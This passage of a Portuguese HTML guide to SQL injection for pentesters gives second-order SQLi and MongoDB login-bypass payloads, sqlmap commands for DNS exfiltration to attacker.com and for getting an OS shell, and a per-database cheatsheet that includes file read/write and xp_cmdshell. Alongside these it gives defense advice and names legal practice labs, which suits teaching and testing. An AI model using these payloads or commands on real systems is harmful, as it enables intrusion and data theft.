                        <p>O ataque ocorre em duas etapas: primeiro, o payload √© inserido no banco de dados. Depois, quando a aplica√ß√£o recupera e usa esse dado de forma insegura, a inje√ß√£o √© executada.</p>
                        <div class="code-block">
<span class="code-comment">-- Passo 1: Inserir um payload malicioso no lugar de um nome de usu√°rio.</span>
<span class="code-comment">-- Ex: Em uma p√°gina de cadastro, o usu√°rio se registra com o nome:</span>
<span class="code-string">admin'--</span>

<span class="code-comment">-- Passo 2: A aplica√ß√£o recupera esse dado para outra query.</span>
<span class="code-comment">-- Ex: Em uma p√°gina de perfil, a query seria:</span>
<span class="code-keyword">SELECT</span> * <span class="code-keyword">FROM</span> users <span class="code-keyword">WHERE</span> username = '<span class="code-string">admin'--</span>'
<span class="code-comment">-- O '--' comenta o resto da query original, potencialmente logando como admin.</span>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Se√ß√£o NoSQL Injection -->
            <div class="content-section" id="nosql">
                <div class="section-header">
                    <h1 class="section-title">NoSQL Injection</h1>
                    <p class="section-description">T√©cnicas de inje√ß√£o para bancos de dados NoSQL como MongoDB</p>
                </div>
                <div class="card">
                    <div class="card-header">
                        <h3>Explora√ß√£o de NoSQL Injection</h3>
                        <span class="risk-badge high">ALTO RISCO</span>
                    </div>
                    <div class="card-body">
                        <p>A inje√ß√£o em bancos NoSQL explora a forma como a aplica√ß√£o constr√≥i queries, muitas vezes baseadas em JSON. O atacante pode injetar operadores do pr√≥prio NoSQL.</p>
                        <div class="code-block">
<span class="code-comment">-- Bypass de login (MongoDB)</span>
<span class="code-comment">-- A aplica√ß√£o espera: {"username": "user", "password": "pass"}</span>
<span class="code-comment">-- Atacante envia: {"username": {"$ne": null}, "password": {"$ne": null}}</span>
<span class="code-comment">-- Isso pode ser traduzido como "onde o usu√°rio n√£o √© nulo E a senha n√£o √© nula".</span>

<span class="code-comment">-- Usando operadores de consulta para bypass</span>
<span class="code-string">{"username": "admin", "password": {"$gt": ""}}</span>
<span class="code-comment">-- Verifica se a senha √© "maior que" uma string vazia, o que √© sempre verdade.</span>

<span class="code-comment">-- Inje√ß√£o de JavaScript (quando $where ou mapReduce √© usado)</span>
<span class="code-string">{"$where": "this.credits == this.debits || 'a'=='a'"}</span>
                        </div>
                         <div class="db-badges">
                            <span class="db-badge mongo">MongoDB</span>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Se√ß√£o Vetores de Ataque Adicionais -->
            <div class="content-section" id="advanced-defense-vectors">
                <div class="section-header">
                    <h1 class="section-title">Vetores de Ataque Adicionais e Suas Defesas</h1>
                    <p class="section-description">Compreendendo t√°ticas menos comuns para fortalecer as defesas da sua aplica√ß√£o.</p>
                </div>
                <div class="card-grid">
                    <div class="card">
                        <div class="card-header">
                            <h3>Inje√ß√£o por Truncamento (SQL Truncation)</h3>
                            <span class="risk-badge medium">RISCO M√âDIO</span>
                        </div>
                        <div class="card-body">
                            <p>Este ataque explora o comportamento de bancos de dados que truncam (encurtam) silenciosamente os dados de entrada se forem mais longos que o tamanho definido para a coluna, permitindo a cria√ß√£o de contas com nomes de usu√°rio de administradores ou a sobreposi√ß√£o de contas existentes.</p>
                            <div class="protection-tip tip-box">
                                <strong>üõ°Ô∏è Estrat√©gia de Defesa:</strong>
                                <ul>
                                    <li><strong>Valida√ß√£o de Comprimento:</strong> A defesa mais eficaz √© validar o comprimento da entrada na camada da aplica√ß√£o <em>antes</em> de envi√°-la ao banco de dados. Se o campo de nome de usu√°rio aceita 20 caracteres, a aplica√ß√£o deve rejeitar qualquer entrada com mais de 20 caracteres.</li>
                                    <li><strong>Modo SQL Estrito (Strict Mode):</strong> Em bancos como o MySQL, habilitar o "Strict SQL Mode" faz com que o banco gere um erro em vez de truncar os dados, impedindo o ataque.</li>
                                    <li><strong>Feedback de Erro:</strong> Configure o banco para retornar erros em caso de truncamento, em vez de realizar a opera√ß√£o silenciosamente.</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="card">
                         <div class="card-header">
                            <h3>Enumera√ß√£o de Colunas via Erro</h3>
                            <span class="risk-badge medium">RISCO M√âDIO</span>
                        </div>
                        <div class="card-body">
                            <p>Atacantes podem usar cl√°usulas como <code>ORDER BY</code> ou <code>GROUP BY</code> com n√∫meros crescentes para deduzir o n√∫mero de colunas na consulta original. O ataque se baseia na mensagem de erro que o banco retorna quando o n√∫mero excede a contagem real de colunas.</p>
                             <div class="protection-tip tip-box">
                                <strong>üõ°Ô∏è Estrat√©gia de Defesa:</strong>
                                <ul>
                                    <li><strong>Supress√£o de Mensagens de Erro:</strong> A medida mais cr√≠tica √© nunca exibir mensagens de erro detalhadas do banco de dados para o usu√°rio final. Implemente p√°ginas de erro gen√©ricas que n√£o revelem a estrutura interna da aplica√ß√£o ou do banco.</li>
                                    <li><strong>Consultas Parametrizadas:</strong> Embora o objetivo aqui seja a enumera√ß√£o e n√£o a inje√ß√£o direta de dados, o uso de prepared statements impede que o atacante possa sequer injetar a cl√°usula <code>ORDER BY</code>.</li>
                                    <li><strong>Logging no Servidor:</strong> Monitore os logs da aplica√ß√£o para identificar m√∫ltiplos erros sequenciais de SQL vindos do mesmo endere√ßo IP, o que pode indicar uma tentativa de enumera√ß√£o.</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="card">
                        <div class="card-header">
                            <h3>Inje√ß√£o via Cabe√ßalhos HTTP</h3>
                            <span class="risk-badge high">ALTO RISCO</span>
                        </div>
                        <div class="card-body">
                            <p>Muitas aplica√ß√µes registram cabe√ßalhos HTTP (como <code>User-Agent</code>, <code>Referer</code>, ou cabe√ßalhos customizados como <code>X-Forwarded-For</code>) em um banco de dados para fins de an√°lise ou logging. Se esses valores n√£o forem devidamente sanitizados, eles se tornam um vetor para SQL Injection.</p>
                            <div class="protection-tip tip-box">
                                <strong>üõ°Ô∏è Estrat√©gia de Defesa:</strong>
                                <ul>
                                    <li><strong>Trate Todas as Entradas como N√£o Confi√°veis:</strong> A regra de ouro √© nunca confiar em <em>nenhum</em> dado vindo do cliente, incluindo cabe√ßalhos HTTP. Todos os dados devem ser validados e sanitizados.</li>
                                     <li><strong>Use Consultas Parametrizadas para Logging:</strong> Ao salvar cabe√ßalhos ou qualquer outro dado no banco, sempre use prepared statements. Nunca concatene o valor do cabe√ßalho diretamente na string da query.</li>
                                    <li><strong>Valida√ß√£o e Limpeza:</strong> Antes de salvar, valide o formato e o conte√∫do dos cabe√ßalhos. Remova caracteres inesperados ou codifique-os apropriadamente.</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="card">
                        <div class="card-header">
                            <h3>Inje√ß√£o de Autentica√ß√£o em Massa</h3>
                             <span class="risk-badge high">ALTO RISCO</span>
                        </div>
                        <div class="card-body">
                            <p>Esta t√©cnica, muitas vezes usada em ataques de *credential stuffing*, tenta explorar uma vulnerabilidade de SQLi na p√°gina de login para testar um grande n√∫mero de combina√ß√µes de usu√°rio/senha com uma √∫nica requisi√ß√£o. O payload √© constru√≠do para simular m√∫ltiplas verifica√ß√µes l√≥gicas dentro de uma √∫nica query.</p>
                            <div class="protection-tip tip-box">
                                <strong>üõ°Ô∏è Estrat√©gia de Defesa:</strong>
                                <ul>
                                    <li><strong>Rate Limiting e Bloqueio de IP:</strong> Implemente um limite estrito no n√∫mero de tentativas de login falhas por um per√≠odo de tempo (ex: 5 tentativas em 15 minutos) para um mesmo IP ou conta. Bloqueie temporariamente o IP ap√≥s exceder o limite.</li>
                                    <li><strong>CAPTCHA:</strong> Ap√≥s algumas tentativas de login falhas, exija a resolu√ß√£o de um CAPTCHA para provar que o usu√°rio √© humano.</li>
                                    <li><strong>Monitoramento de Anomalias:</strong> Monitore os logs para detectar um volume anormal de falhas de login. Alertas autom√°ticos podem ajudar a identificar e responder a esses ataques em tempo real.</li>
                                    <li><strong>Consultas Parametrizadas:</strong> A defesa fundamental. Se a query de login usar prepared statements, a inje√ß√£o de l√≥gica adicional se torna imposs√≠vel.</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Se√ß√£o Ferramentas -->
            <div class="content-section" id="tools">
                <div class="section-header">
                    <h1 class="section-title">Ferramentas PRO para SQL Injection</h1>
                    <p class="section-description">Software avan√ßado para detec√ß√£o e explora√ß√£o de vulnerabilidades SQLi</p>
                </div>
                
                <div class="tool-item">
                    <div class="tool-name">SQLMap - Scanner Autom√°tico Avan√ßado</div>
                    <div class="tool-desc">Ferramenta mais completa para detec√ß√£o e explora√ß√£o autom√°tica de SQL Injection</div>
                    <div class="code-block">
<span class="code-comment"># Detec√ß√£o avan√ßada com tampering e risk elevado</span>
sqlmap <span class="code-operator">-</span>u <span class="code-string">"http://site.com/page?id=1"</span> <span class="code-operator">--</span>level<span class="code-operator">=</span><span class="code-number">5</span> <span class="code-operator">--</span>risk<span class="code-operator">=</span><span class="code-number">3</span> <span class="code-operator">--</span>tamper<span class="code-operator">=</span>between,randomcase

<span class="code-comment"># Exfiltra√ß√£o de dados via DNS</span>
sqlmap <span class="code-operator">-</span>u <span class="code-string">"http://site.com/page?id=1"</span> <span class="code-operator">--</span>dns<span class="code-operator">-</span>domain<span class="code-operator">=</span>attacker.com

<span class="code-comment"># Obter um OS Shell</span>
sqlmap <span class="code-operator">-</span>u <span class="code-string">"http://site.com/page?id=1"</span> <span class="code-operator">--</span>os-shell
                    </div>
                </div>

                <div class="tool-item">
                    <div class="tool-name">Outras Ferramentas Relevantes</div>
                    <div class="tool-desc">Ferramentas especializadas para cen√°rios espec√≠ficos</div>
                     <div class="code-block">
<span class="code-comment"># NoSQLMap - Para Bancos NoSQL</span>
nosqlmap <span class="code-operator">-</span>u <span class="code-string">"http://site.com"</span> <span class="code-operator">--</span>test <span class="code-operator">--</span>mongodb

<span class="code-comment"># BBQSQL - Ferramenta para Blind SQLi</span>
bbqsql <span class="code-operator">--</span>url <span class="code-string">"http://site.com"</span> <span class="code-operator">--</span>data <span class="code-string">"param=value"</span> <span class="code-operator">--</span>method <span class="code-string">"POST"</span>
                    </div>
                </div>
            </div>

            <!-- Se√ß√£o Cheatsheet Comparativo -->
            <div class="content-section" id="comparison">
                 <div class="section-header">
                    <h1 class="section-title">Cheatsheet Comparativo por SGBD</h1>
                    <p class="section-description">Comandos √∫teis e suas varia√ß√µes nos principais bancos de dados</p>
                </div>
                 <table class="cheatsheet-table">
                    <thead>
                        <tr>
                            <th>Fun√ß√£o</th>
                            <th>MySQL</th>
                            <th>PostgreSQL</th>
                            <th>SQL Server</th>
                            <th>Oracle</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Vers√£o</td>
                            <td>@@version, version()</td>
                            <td>version()</td>
                            <td>@@version</td>
                            <td>SELECT banner FROM v$version</td>
                        </tr>
                        <tr>
                            <td>Usu√°rio</td>
                            <td>user(), current_user()</td>
                            <td>current_user</td>
                            <td>user_name(), system_user</td>
                            <td>user</td>
                        </tr>
                        <tr>
                            <td>Banco atual</td>
                            <td>database()</td>
                            <td>current_database()</td>
                            <td>db_name()</td>
                            <td>SELECT name FROM v$database</td>
                        </tr>
                        <tr>
                            <td>Listar tabelas</td>
                            <td>FROM information_schema.tables</td>
                            <td>FROM information_schema.tables</td>
                            <td>FROM sysobjects WHERE xtype='U'</td>
                            <td>SELECT table_name FROM all_tables</td>
                        </tr>
                        <tr>
                            <td>Listar colunas</td>
                            <td>FROM information_schema.columns</td>
                            <td>FROM information_schema.columns</td>
                            <td>FROM syscolumns</td>
                            <td>SELECT column_name FROM all_tab_columns</td>
                        </tr>
                        <tr>
                            <td>Delay</td>
                            <td>SLEEP(5), BENCHMARK()</td>
                            <td>pg_sleep(5)</td>
                            <td>WAITFOR DELAY '0:0:5'</td>
                            <td>DBMS_LOCK.SLEEP(5)</td>
                        </tr>
                        <tr>
                            <td>Leitura de Arquivos</td>
                            <td>LOAD_FILE()</td>
                            <td>pg_read_file()</td>
                            <td>OPENROWSET(BULK)</td>
                            <td>UTL_FILE</td>
                        </tr>
                        <tr>
                            <td>Escrita de Arquivos</td>
                            <td>INTO OUTFILE/DUMPFILE</td>
                            <td>COPY TO</td>
                            <td>xp_cmdshell</td>
                            <td>UTL_FILE</td>
                        </tr>
                    </tbody>
                </table>
            </div>

            <!-- Se√ß√£o Pr√°tica -->
            <div class="content-section" id="practice">
                <div class="section-header">
                    <h1 class="section-title">Ambientes de Pr√°tica Seguros</h1>
                    <p class="section-description">Plataformas para praticar SQL Injection de forma legal e segura</p>
                </div>
                
                <div class="card">
                    <div class="card-header">
                        <h3>Ambientes Controlados</h3>
                        <span class="risk-badge low">SEGURO</span>
                    </div>
                    <div class="card-body">
                        <p>Para praticar SQL Injection de forma legal e segura, utilize os seguintes ambientes:</p>
                        <ul style="padding-left: 20px; margin: 15px 0;">
                            <li><strong>DVWA (Damn Vulnerable Web Application)</strong> - Aplica√ß√£o web vulner√°vel por design</li>
                            <li><strong>SQLi Labs</strong> - Ambiente focado especificamente em SQL Injection</li>
                            <li><strong>Web Security Dojo</strong> - Plataforma de treinamento com v√°rios desafios</li>
                            <li><strong>OWASP Juice Shop</strong> - Aplica√ß√£o moderna com vulnerabilidades intencionais</li>
                            <li><strong>Hack The Box / TryHackMe</strong> - Plataformas com m√°quinas virtuais vulner√°veis</li>
                        </ul>
                        <p>Estes ambientes permitem praticar t√©cnicas de SQL Injection sem violar leis ou causar danos a sistemas reais.</p>
                    </div>
                </div>
            </div>

            <!-- Se√ß√£o Defesa -->
            <div class="content-section" id="defense">
                <div class="section-header">
                    <h1 class="section-title">Estrat√©gias de Defesa Avan√ßadas</h1>
                    <p class="section-description">Medidas proativas para proteger contra t√©cnicas avan√ßadas de SQL Injection</p>
                </div>
                
                <div class="card-grid">
                    <div class="card">
                        <div class="card-header">
                            <h3>Defesa em Profundidade</h3>
                            <span class="risk-badge low">PROTE√á√ÉO</span>
                        </div>
                        <div class="card-body">
                            <p>Implemente m√∫ltiplas camadas de seguran√ßa:</p>
                            <div class="code-block">
<span class="code-comment">// Use prepared statements (ex: PHP com PDO)</span>
<span class="code-keyword">$stmt</span> = <span class="code-keyword">$pdo</span>->prepare(<span class="code-string">"SELECT * FROM users WHERE id = ?"</span>);
<span class="code-keyword">$stmt</span>->execute([<span class="code-keyword">$id</span>]);

<span class="code-comment">// Input Validation - Abordagem de Whitelist</span>
<span class="code-keyword">if</span> (!ctype_digit(<span class="code-keyword">$id</span>)) {
    <span class="code-comment">// Lidar com input inv√°lido</span>
}

<span class="code-comment">-- Hardening do Banco de Dados: Princ√≠pio do Menor Privil√©gio</span>
<span class="code-operator">REVOKE</span> <span class="code-operator">ALL</span> <span class="code-operator">ON</span> database.* <span class="code-operator">FROM</span> 'app_user'@'localhost';
<span class="code-operator">GRANT</span> <span class="code-operator">SELECT</span>, <span class="code-operator">INSERT</span>, <span class="code-operator">UPDATE</span> <span class="code-operator">ON</span> database.table <span class="code-operator">TO</span> 'app_user'@'localhost';
                            </div>
                            <div class="protection-tip tip-box">
                                <strong>üõ°Ô∏è ESTRAT√âGIAS CHAVE:</strong> 
                                <ul>
                                    <li>Valida√ß√£o de input com whitelist (permitir apenas o esperado).</li>
                                    <li>Uso mandat√≥rio de Prepared Statements (ou consultas parametrizadas).</li>
                                    <li>Princ√≠pio do menor privil√©gio para usu√°rios do banco.</li>
                                    <li>Logging e monitoramento cont√≠nuo de queries suspeitas.</li>
                                    <li>Implementa√ß√£o de um WAF (Web Application Firewall).</li>
                                    <li>N√£o expor mensagens de erro detalhadas do banco ao usu√°rio final.</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Footer -->
            <footer>
                <p>Guia compilado e otimizado por Alexander.</p>
                <p>¬© 2025 - Guia Definitivo de SQL Injection para Pentesters</p>
            </footer>

            <!-- Mensagem de c√≥pia -->
            <div class="copied-message" id="copiedMessage">C√≥digo copiado para a √°rea de transfer√™ncia!</div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const navItems = document.querySelectorAll('.nav-item');
            const contentSections = document.querySelectorAll('.content-section');
            const hamburger = document.querySelector('.hamburger');
            const sidebar = document.querySelector('.sidebar');
            const themeToggle = document.getElementById('themeToggle');
            const exportPdf = document.getElementById('exportPdf');
            
            function showSection(sectionId) {
                contentSections.forEach(section => section.classList.remove('active'));
                
                const targetSection = document.getElementById(sectionId);
                if (targetSection) {
                    targetSection.classList.add('active');
                }
                
                navItems.forEach(item => {
                    item.classList.remove('active');
                    if (item.getAttribute('data-section') === sectionId) {
                        item.classList.add('active');
                    }
                });
                
                if (window.innerWidth <= 1024) {
                    sidebar.classList.remove('active');
                    hamburger.classList.remove('active');
                    hamburger.setAttribute('aria-expanded', 'false');
                    hamburger.setAttribute('aria-label', 'Abrir menu de navega√ß√£o');
                }
            }
            
            navItems.forEach(item => {
                item.addEventListener('click', function(e) {
                    e.preventDefault();
                    const sectionId = this.getAttribute('data-section');
                    showSection(sectionId);
                    document.querySelector('.main-content').scrollTo(0, 0);
                });
            });
            
            hamburger.addEventListener('click', function() {
                const isActive = hamburger.classList.toggle('active');
                sidebar.classList.toggle('active');
                hamburger.setAttribute('aria-expanded', isActive);
                hamburger.setAttribute('aria-label', isActive ? 'Fechar menu de navega√ß√£o' : 'Abrir menu de navega√ß√£o');
            });
            
            document.addEventListener('click', function(e) {
                if (window.innerWidth <= 1024 && !sidebar.contains(e.target) && !hamburger.contains(e.target)) {
                    sidebar.classList.remove('active');
                    hamburger.classList.remove('active');
                    hamburger.setAttribute('aria-expanded', 'false');
                    hamburger.setAttribute('aria-label', 'Abrir menu de navega√ß√£o');
                }
            });
            
            const codeBlocks = document.querySelectorAll('.code-block');
            const copiedMessage = document.getElementById('copiedMessage');
            
            codeBlocks.forEach(block => {
                block.addEventListener('click', function() {
                    const textToCopy = this.innerText;
                    if (navigator.clipboard && window.isSecureContext) {
                        navigator.clipboard.writeText(textToCopy).then(() => showCopiedMessage()).catch(err => fallbackCopy(textToCopy));
                    } else {
                        fallbackCopy(textToCopy);
                    }
                });
            });
            
            function fallbackCopy(text) {
                const textArea = document.createElement('textarea');
                textArea.value = text;
                document.body.appendChild(textArea);
                textArea.select();
                try {
                    document.execCommand('copy');
                    showCopiedMessage();
                } catch (err) {
                    console.error('Fallback copy failed: ', err);
                }
                document.body.removeChild(textArea);
            }
            
            function showCopiedMessage(message = 'C√≥digo copiado para a √°rea de transfer√™ncia!') {
                copiedMessage.textContent = message;
                copiedMessage.style.opacity = '1';
                setTimeout(() => {
                    copiedMessage.style.opacity = '0';
                }, 3000);
            }
            
            function toggleTheme() {
                const currentTheme = document.body.getAttribute('data-theme');
                const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
                document.body.setAttribute('data-theme', newTheme);
                
                const icon = themeToggle.querySelector('i');
                icon.className = newTheme === 'light' ? 'fas fa-sun' : 'fas fa-moon';
                themeToggle.title = newTheme === 'light' ? 'Alternar para modo escuro' : 'Alternar para modo claro';
                
                localStorage.setItem('theme', newTheme);
            }
            
            themeToggle.addEventListener('click', toggleTheme);
            
            const savedTheme = localStorage.getItem('theme') || 'dark';
            document.body.setAttribute('data-theme', savedTheme);
            if (savedTheme === 'light') {
                themeToggle.querySelector('i').className = 'fas fa-sun';
                themeToggle.title = 'Alternar para modo escuro';
            }
            
            exportPdf.addEventListener('click', function() {
                const element = document.querySelector('.main-content');
                const opt = {
                    margin: [10, 10, 10, 10],
                    filename: 'Guia_SQL_Injection_Completo.pdf',
                    image: { type: 'jpeg', quality: 0.98 },
                    html2canvas: { scale: 2, useCORS: true },
                    jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' },
                    pagebreak: { mode: ['avoid-all', 'css', 'legacy'] }
                };
                
                const originalText = exportPdf.innerHTML;
                exportPdf.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
                exportPdf.disabled = true;
                
                html2pdf().set(opt).from(element).save().then(() => {
                    exportPdf.innerHTML = originalText;
                    exportPdf.disabled = false;
                    showCopiedMessage('PDF gerado com sucesso!');
                }).catch(err => {
                    console.error('Erro ao gerar PDF:', err);
                    exportPdf.innerHTML = originalText;
                    exportPdf.disabled = false;
                    alert('Erro ao gerar PDF. Tente novamente.');
                });
            });
            
            showSection('introduction');
        });
    </script>
</body>
</html>


